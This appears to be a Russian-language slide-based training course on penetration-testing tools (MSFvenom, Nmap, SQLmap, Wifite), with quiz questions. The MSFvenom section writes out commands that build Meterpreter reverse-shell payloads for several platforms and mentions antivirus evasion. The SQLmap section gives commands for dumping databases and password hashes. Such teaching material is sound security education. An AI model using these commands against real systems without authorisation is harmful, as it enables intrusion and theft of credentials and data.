MSFvenom: Создание и доставка пейлоадов

Что такое MSFvenom?

MSFvenom - это инструмент создания и кодирования пейлоадов для различных сценариев тестирования на проникновение.

  • 1
    Создавать пейлоады для различных операционных систем
  • 2
    Использовать различные форматы вывода
  • 3
    Обходить обнаружение антивирусами используя кодировщики
Слайд 1 из 5

Основные концепции MSFvenom

MSFvenom объединяет функциональность двух устаревших инструментов:

  • msfpayload: создание пейлоадов
  • msfencode: кодирование пейлоадов

Ключевые понятия:

  • Payload: код, который выполняется на целевой системе
  • Staged: двухэтапный пейлоад (маленький загрузчик → основной пейлоад)
  • Non-staged: одноэтапный пейлоад (выполняется целиком сразу)
  • Encoder: метод обфускации пейлоада для обхода защитных механизмов

Создание пейлоадов для различных платформ

Базовый синтаксис MSFvenom:

msfvenom -p [пейлоад] LHOST=[IP] LPORT=[порт] -f [формат] -o [имя_файла]

Примеры для различных платформ:

# Windows EXE пейлоад msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe # Linux ELF пейлоад msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o payload.elf # Android APK пейлоад (требует шаблон APK) msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o payload.apk # PHP пейлоад для веб-серверов msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.php

Nmap: Сканирование сетей и обнаружение уязвимостей

Что такое Nmap?

Nmap (Network Mapper) - это утилита с открытым исходным кодом для исследования сети и аудита безопасности.

  • 1
    Обнаруживать хосты и сервисы в сети
  • 2
    Определять операционные системы удаленных устройств
  • 3
    Выявлять потенциальные уязвимости в сетевой инфраструктуре
Слайд 1 из 5

Основные команды Nmap

Базовый синтаксис Nmap:

nmap [опции] {цель}

Простое сканирование хоста:

# Сканирование одного хоста nmap 192.168.1.1 # Сканирование диапазона IP-адресов nmap 192.168.1.1-254 # Сканирование всей подсети nmap 192.168.1.0/24 # Сканирование хоста по доменному имени nmap example.com

Какая запись используется для сканирования всех 254 хостов в подсети 192.168.1.x?

192.168.1.*
192.168.1.1-254
192.168.1.0/24
192.168.1.all
Слайд 2 из 5

Типы сканирования портов

Nmap поддерживает различные типы сканирования портов:

# TCP SYN сканирование (полуоткрытое, требует прав администратора) nmap -sS 192.168.1.1 # TCP connect сканирование (полное TCP-соединение) nmap -sT 192.168.1.1 # UDP сканирование nmap -sU 192.168.1.1 # Комбинированное TCP и UDP сканирование nmap -sS -sU 192.168.1.1 # Сканирование всех 65535 портов nmap -p- 192.168.1.1 # Сканирование определенных портов nmap -p 22,80,443 192.168.1.1

Какой тип сканирования является наиболее скрытным?

-sT (TCP Connect)
-sS (TCP SYN)
-sU (UDP)
-sA (ACK)

Расширенные возможности Nmap

Определение версий сервисов и операционной системы:

# Определение версий сервисов nmap -sV 192.168.1.1 # Определение ОС nmap -O 192.168.1.1 # Агрессивное сканирование (комбинация опций) nmap -A 192.168.1.1

Скрытое сканирование и уровни времени:

# Скрытое сканирование nmap -T0 192.168.1.1 # Очень медленное nmap -T1 192.168.1.1 # Медленное nmap -T2 192.168.1.1 # Нормальное nmap -T3 192.168.1.1 # По умолчанию nmap -T4 192.168.1.1 # Агрессивное nmap -T5 192.168.1.1 # Самое быстрое
Слайд 4 из 5

Скрипты NSE и заключение

Nmap Script Engine (NSE) расширяет возможности Nmap:

# Запуск скриптов категории 'vuln' для поиска уязвимостей nmap --script vuln 192.168.1.1 # Запуск конкретного скрипта nmap --script http-title 192.168.1.1 # Запуск нескольких категорий скриптов nmap --script "default,safe,discovery" 192.168.1.1 # Сохранение результатов в файл nmap -A 192.168.1.1 -oN результат.txt

Полезные категории скриптов:

  • default: безопасные скрипты по умолчанию
  • discovery: сбор дополнительной информации
  • safe: скрипты, которые не должны повредить целевой системе
  • vuln: обнаружение уязвимостей
  • exploit: эксплуатация уязвимостей (с осторожностью!)

Основы работы с SQLmap

Извлечение данных из базы данных

Базовые команды для извлечения данных:

# Список доступных баз данных sqlmap -u "http://example.com/page.php?id=1" --dbs # Список таблиц в конкретной базе данных sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables # Список столбцов в конкретной таблице sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --columns # Дамп данных из таблицы sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name -C column1,column2 --dump

Получение данных пользователей и паролей:

# Получение данных текущего пользователя базы данных sqlmap -u "http://example.com/page.php?id=1" --current-user # Получение хешей паролей из таблицы пользователей sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --passwords

Wifite: Автоматизированный аудит Wi-Fi сетей

Что такое Wifite?

Wifite - это инструмент автоматизации атак на беспроводные сети, упрощающий сложные процессы тестирования безопасности Wi-Fi.

  • 1
    Автоматизированное сканирование и атаки на Wi-Fi сети
  • 2
    Поддержка множества атак для различных протоколов (WEP, WPA, WPS)
  • 3
    Интеграция с другими инструментами (Aircrack-ng, Reaver, и т.д.)

Основы работы с Wifite

Простой запуск Wifite:

# Запуск Wifite с настройками по умолчанию wifite # Запуск от имени администратора (обычно необходимо) sudo wifite
